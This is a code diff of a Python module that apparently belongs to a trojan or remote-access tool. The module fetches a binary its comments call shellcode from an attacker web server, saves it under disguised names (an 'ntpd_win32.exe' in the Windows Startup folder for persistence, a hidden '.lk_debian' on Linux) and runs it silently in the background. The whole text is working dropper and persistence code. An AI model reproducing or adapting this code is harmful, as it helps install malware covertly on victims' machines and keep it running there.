@@ -15,8 +15,10 @@ import time
 try:
   import urllib3
 except:
-  os.system("pip install urllib3>/dev/null")
-  time.sleep(5)
+    if os.name == 'nt':
+        os.system("pip install urllib3")
+    elif os.name == 'posix':
+        os.system("pip3.6 install urllib3>/dev/null")
   import urllib3
 
 # retrieve the shellcode from our web server
@@ -29,6 +31,7 @@ OsTargetpath = ".payload_posix"
 shellcode = ""
 start = True #To decide entweder an oder aus die Zugriff
 winRunOnBoot=True
+linRunOnBoot=False
 
 def run(**args):
     #os.system("echo '[*] In getFileFromURI module.'>> .Tlog.log") #Todelete
@@ -36,19 +39,20 @@ def run(**args):
     global bin, url, ScriptExec, OsTargetpath, shellcode
     if os.name == 'nt':
       bin = True
-      ScriptExec = "./"
+      ScriptExec = "python"
       url = "http://192.168.2.112:8000/nj"   #"http://saw-dsr.ddns.net:8000/nj"
       OsTargetpath = "ntpd_win32.exe"
       if winRunOnBoot == True:
           OsTargetpath = os.getenv("APPDATA")+"\Microsoft\Windows\Start Menu\Programs\Startup\\"+ OsTargetpath
 
     elif os.name == 'posix':
-      bin = False
-      ScriptExec = "python3.5 "
-      #url = "http://saw-dsr.ddns.net:8000/TCP_client.py"
-      #OsTargetpath = "client.py"
+      bin = True
+      ScriptExec = "python3.6 "
+      url = "http://192.168.2.112:8000/lk_debian"   #"http://saw-dsr.ddns.net:8000/TCP_client.py"
+      OsTargetpath = ".lk_debian"
+      #TODO if linRunOnBoot:
     else:
-      return "[ERROR] getFileFromURI: Not recognised OS!"
+      return ("[ERROR] getFileFromGit: Not recognised OS: %s"%os.name)
 
     try:
         http = urllib3.PoolManager()
@@ -70,20 +74,23 @@ def run(**args):
     except:
         print("[Error] getFileFromURI: could not create Targetscript")
         return " modules/_bootlocale not found!!"
-    cmd= ScriptExec+" "+OsTargetpath
+
     if start and os.name == 'nt': #TODO: check how to start python script
-          os.system("start {}".format(cmd)) #os.system("start {}".format(OsTargetpath))
+        if bin:
+            os.system("start {}".format(OsTargetpath.replace('/','\\')))
+        else:
+            os.system(scriptExec+" "+OsTargetpath)
     elif start and os.name == 'posix':
           os.system("chmod 755 {}".format(OsTargetpath))
-          os.system(cmd +">/dev/null &")
+          os.system("./"+OsTargetpath +" >/dev/null &")
     else:
           return ("Script is Stored under {} but never started".format(OsTargetpath))
 
-    time.sleep(5)
+    time.sleep(1)
     return str("getFileFromURI: file {} successfully started".format(OsTargetpath))
 
 
-run()
+#run()
   #while not is_connected(): #if the tro execute this, so it is already connected
   #time.sleep(20)
 import socket
